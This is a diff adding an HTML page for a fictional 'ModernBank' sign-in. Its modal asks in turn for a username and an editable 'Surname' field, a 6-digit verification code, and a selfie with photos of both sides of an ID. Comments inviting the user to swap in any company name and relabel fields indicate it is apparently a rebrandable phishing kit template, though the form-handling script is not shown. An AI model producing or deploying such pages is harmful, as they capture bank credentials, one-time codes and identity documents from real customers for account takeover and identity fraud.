@@ -1,0 +1,81 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title id="pageTitle">ModernBank — Secure Access</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<header class="topbar">
+  <div class="top-inner">
+    <!-- === CHANGE COMPANY NAME HERE === -->
+    <a class="brand" id="brandName">ModernBank</a>
+    <nav>
+      <button class="btn-pill" id="openBtn">Sign In</button>
+    </nav>
+  </div>
+</header>
+
+<main class="hero">
+  <div class="hero-inner">
+    <div class="hero-copy">
+      <h1 class="headline">Welcome to <span id="brandInHero">ModernBank</span></h1>
+      <p class="lead">Secure access for customers — modern, fast and human-friendly.</p>
+      <button class="cta-primary" id="startFlow">Get Started</button>
+    </div>
+    <div class="hero-visual"></div>
+  </div>
+</main>
+
+<!-- modal -->
+<div id="modal" class="modal hidden">
+  <div class="modal-card">
+    <button class="close" id="closeBtn">✕</button>
+
+    <!-- STEP 1: Username + Surname (editable field) -->
+    <section id="step1" class="step active">
+      <h2>Sign In</h2>
+      <form id="loginForm" autocomplete="off">
+        <label>Username<input name="username" type="text" required></label>
+        <!-- === EDITABLE FIELD: Change 'Surname' to anything === -->
+        <label id="editableLabel">Surname<input name="editable" type="text" required></label>
+        <div class="row">
+          <button type="submit" class="btn-primary">Continue</button>
+        </div>
+      </form>
+    </section>
+
+    <!-- STEP 2: Verification Code -->
+    <section id="step2" class="step hidden">
+      <h2>Verification Code</h2>
+      <form id="codeForm" autocomplete="off">
+        <label>6-digit code<input name="code" type="text" maxlength="6" pattern="[0-9]{6}" required></label>
+        <div class="row">
+          <button class="btn-primary" type="submit">Verify</button>
+          <button class="btn-link" id="backToStep1">Back</button>
+        </div>
+      </form>
+    </section>
+
+    <!-- STEP 3: KYC Upload -->
+    <section id="step3" class="step hidden">
+      <h2>KYC — Upload Photos</h2>
+      <form id="kycForm" enctype="multipart/form-data">
+        <label>Photo 1 (Selfie)<input name="photo1" type="file" accept="image/*" required></label>
+        <label>Photo 2 (ID front)<input name="photo2" type="file" accept="image/*"></label>
+        <label>Photo 3 (ID back)<input name="photo3" type="file" accept="image/*"></label>
+        <div class="row">
+          <button class="btn-primary" type="submit">Send KYC & Finish</button>
+        </div>
+      </form>
+    </section>
+
+    <div id="status" class="muted small"></div>
+  </div>
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
